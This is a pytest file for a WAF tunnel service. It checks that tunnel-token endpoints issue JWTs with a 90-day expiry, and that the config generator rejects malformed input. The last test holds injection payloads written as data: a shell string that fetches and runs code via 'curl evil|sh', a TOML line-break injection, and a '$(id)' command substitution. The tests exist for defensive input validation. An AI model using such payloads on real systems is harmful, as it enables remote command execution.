"""
Scenario: 2026-09-20 -- both tunnel-token-issuing endpoints minted tokens
using auth_service's login-session default (60 minutes,
ACCESS_TOKEN_EXPIRE_MINUTES) instead of a lifetime appropriate for a
persistent tunnel connection (Restart=always, meant to run unattended for
months). Confirmed live on a real Lab deploy: its frpc.toml tokens had
expired ~8h after being issued, silently breaking every proxy on that
agent with "Invalid or expired WAF Tunnel Token" until someone happened to
notice.

POST /api/tunnel/token was the more insidious case: it computed
expires_sec = expires_days * 86400 and returned "expires_in_days": 365 in
its response, but never actually passed that to create_access_token --
the response was lying about the real expiry the whole time.

These tests decode the real JWT returned by each endpoint and assert its
`exp` claim reflects a long lifetime, not the ~1h a stale/re-introduced
bug would produce.
"""
import time

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from slowapi import _rate_limit_exceeded_handler
from slowapi.errors import RateLimitExceeded

from services.rate_limiter import limiter
from services.auth_service import AuthService
from api import auth as auth_module
from api import tunnels as tunnels_module

auth_service = AuthService()

ONE_DAY = 86400


@pytest.fixture()
def app() -> FastAPI:
    test_app = FastAPI()
    test_app.state.limiter = limiter
    test_app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
    test_app.include_router(auth_module.router)
    test_app.include_router(tunnels_module.router)
    return test_app


@pytest.fixture()
def client(app: FastAPI) -> TestClient:
    return TestClient(app)


def _decode_exp(token: str) -> float:
    payload = auth_service.decode_token(token)
    assert payload is not None, "token failed to decode/verify"
    return payload["exp"]


def _verified_for(user, domain):
    """P3.2: tokens are issued only for a domain the caller has verified."""
    from services.dynamodb_service import DynamoDBService
    from tests.helpers.seed import make_domain, make_origin
    db = DynamoDBService()
    make_domain(make_origin({"user_id": user["user"]["user_id"]}, db=db), domain, db=db)


def test_post_token_endpoint_actually_honors_a_long_expiry_not_just_the_response_field(
    client: TestClient, register_user, auth_header
):
    """The JWT itself must match the "expires_in_days" the response claims,
    and the default is the 90-day maximum (P3.2, H35), not a 1-hour session."""
    admin = register_user(email="tt-admin1@example.com", username="tt_admin1")
    _verified_for(admin, "long-expiry.example.com")
    before = time.time()

    resp = client.post(
        "/api/tunnels/token",
        json={"domain": "long-expiry.example.com"},
        headers=auth_header(admin["access_token"]),
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["expires_in_days"] == 90

    exp = _decode_exp(body["token"])
    seconds_until_expiry = exp - before
    assert 89 * ONE_DAY < seconds_until_expiry < 91 * ONE_DAY, (
        f"token expires in {seconds_until_expiry / ONE_DAY:.1f} days -- expected 90"
    )


def test_post_token_endpoint_respects_a_caller_supplied_expires_days(
    client: TestClient, register_user, auth_header
):
    admin = register_user(email="tt-admin2@example.com", username="tt_admin2")
    _verified_for(admin, "custom-expiry.example.com")
    before = time.time()

    resp = client.post(
        "/api/tunnels/token",
        json={"domain": "custom-expiry.example.com", "expires_days": 7},
        headers=auth_header(admin["access_token"]),
    )
    assert resp.status_code == 200
    exp = _decode_exp(resp.json()["token"])
    seconds_until_expiry = exp - before
    assert 6 * ONE_DAY < seconds_until_expiry < 8 * ONE_DAY


@pytest.mark.parametrize("days", [0, 91, 365, -1])
def test_expires_days_outside_1_to_90_is_a_422(client: TestClient, register_user, auth_header, days):
    admin = register_user(email="tt-admin4@example.com", username="tt_admin4")
    _verified_for(admin, "range.example.com")
    resp = client.post("/api/tunnels/token", json={"domain": "range.example.com", "expires_days": days},
                       headers=auth_header(admin["access_token"]))
    assert resp.status_code == 422


def test_token_for_a_domain_nobody_verified_is_refused(client: TestClient, register_user, auth_header):
    admin = register_user(email="tt-admin5@example.com", username="tt_admin5")
    resp = client.post("/api/tunnels/token", json={"domain": "unregistered-domain.example.com"},
                       headers=auth_header(admin["access_token"]))
    assert resp.status_code == 403


def test_config_generator_mints_a_long_lived_token_not_a_one_hour_session_token(
    client: TestClient, register_user, auth_header
):
    """This is the endpoint the 1-Click installer's copy-paste command
    actually calls -- the one that broke a real Lab deploy's tunnels ~1h
    after every fresh install before this fix."""
    admin = register_user(email="tt-admin3@example.com", username="tt_admin3")
    _verified_for(admin, "config-gen-test.example.com")
    before = time.time()

    resp = client.get(
        "/api/tunnels/config-generator",
        params={"domain": "config-gen-test.example.com", "port": 3000, "local_ip": "127.0.0.1", "platform": "linux"},
        headers=auth_header(admin["access_token"]),
    )
    assert resp.status_code == 200
    body = resp.json()
    assert "metadatas.token" in body["toml_config"], "the generated frpc.toml must carry the domain-scoped token"

    exp = _decode_exp(body["token"])
    seconds_until_expiry = exp - before
    assert 89 * ONE_DAY < seconds_until_expiry < 91 * ONE_DAY, (
        f"config-generator's token expires in {seconds_until_expiry / ONE_DAY:.1f} days -- "
        f"expected the 90-day maximum (P3.2), not a 1-hour session or an unbounded lifetime"
    )


@pytest.mark.parametrize("params", [
    {"domain": "bad domain.example.com"},
    {"domain": 'x.com";curl evil|sh;#'},
    {"domain": "config-gen-test.example.com", "local_ip": '127.0.0.1"\nserverAddr = "evil'},
    {"domain": "config-gen-test.example.com", "local_ip": "$(id)"},
    {"domain": "config-gen-test.example.com", "port": 0},
    {"domain": "config-gen-test.example.com", "port": 70000},
])
def test_config_generator_refuses_malformed_input_with_422(client: TestClient, register_user, auth_header, params):
    """P3.3 (H68): the domain and address are written into a TOML file and
    a shell command, so anything that is not a hostname/IP is a 422."""
    admin = register_user(email="tt-admin6@example.com", username="tt_admin6")
    _verified_for(admin, "config-gen-test.example.com")
    resp = client.get("/api/tunnels/config-generator", params=params, headers=auth_header(admin["access_token"]))
    assert resp.status_code == 422, resp.text
